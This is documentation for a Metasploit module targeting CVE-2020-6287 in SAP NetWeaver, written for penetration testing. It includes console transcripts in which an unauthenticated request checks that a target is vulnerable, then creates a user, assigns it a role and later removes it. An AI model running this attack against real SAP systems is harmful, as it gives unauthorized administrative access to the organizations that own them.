## Vulnerable Application

This module leverages an unauthenticated web service to submit a job which will create a user with a specified role. The
job involves running a wizard. After the necessary action is taken, the job is canceled to avoid unnecessary system
changes.

SAP NetWeaver NetWeaver versions 7.30 through 7.50 are affected by this vulnerability. An Amazon Machine Image (AMI) for
Amazon Web Services (AWS) can be used as a testing environment. One such image is provided by Linke IT America LLC and
is available on the [AWS Marketplace][1] with installation instructions posted to their [blog][2].

Once set up and configured, the instances will be vulnerable on the default HTTP port 50000.

If the password does not meet the requirements (e.g. the value is too short), the server will respond with an error
message and the Metasploit module will need to be rerun.

## Verification Steps

  1. Install the application
  1. Start msfconsole
  1. Do: `use auxiliary/admin/sap/cve_2020_6287_ws_add_user`
  1. Set the `RHOST`, `USERNAME`, and `PASSWORD` options
  1. Run the module and wait a few seconds
  1. Once the "PCK Upgrade" job has been canceled, log in with the created credentials

## Options

### ROLE

The role to assign to the user in the system. This value is "Administrator" by default. If the role does not exist, then
execution will fail. For more information on users and roles, see the [SAP documentation][3].

From the documentation:
> Standard UME roles include such actions. The UME role Administrator includes Manage_ All, which enables you to display
> and change everything. By default, administrator roles are only assigned to administrators.

## Scenarios

### SAP NetWeaver 7.50

Example: Adding a new user `metasploit` with the `Administrator` role:

```
msf5 > use auxiliary/admin/sap/cve_2020_6287_ws_add_user 
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set RHOSTS netweaver.lan
RHOSTS => netweaver.lan
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set USERNAME metasploit
USERNAME => metasploit
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set PASSWORD 0pe3nS3sam3
PASSWORD => 0pe3nS3sam3
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > check
[+] 192.168.53.183:50000 - The target is vulnerable.
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > run
[*] Running module against 192.168.53.183

[*] Starting the PCK Upgrade job...
[+] Job running with session id: 3e76e705-4bbd-4a6b-b243-154768287fb0
[*] Received event description: Execution of User Management
[*] Received event description: Create User PCKUser
[+] Successfully created the user account
[*] Received event description: Assign Role SAP_XI_PCK_CONFIG to PCKUser
[+] Successfully added the role to the new user
[*] Canceling the PCK Upgrade job...
[*] Auxiliary module execution completed
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) >
```

Example: Removing the user `metasploit`:

```
msf5 > use auxiliary/admin/sap/cve_2020_6287_ws_add_user 
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set RHOSTS netweaver.lan
RHOSTS => netweaver.lan
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set USERNAME metasploit
USERNAME => metasploit
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set PASSWORD 0pe3nS3sam3
PASSWORD => 0pe3nS3sam3
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set ACTION REMOVE
ACTION => REMOVE
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > run
[*] Running module against 192.168.53.183

[+] Successfully deleted the user account
[*] Auxiliary module execution completed
msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) >
```

[1]: https://aws.amazon.com/marketplace/seller-profile?id=56cbce49-5486-4a83-a6b7-0fea3841da1b
[2]: https://docs.linkeit.com/amis/catalog/sap_ready_ami_installation_guide_nw750java_susesyb/
[3]: https://help.sap.com/doc/saphelp_nw73ehp1/7.31.19/en-US/4a/6e8a7ab94e4d27e10000000a42189b/frameset.htm
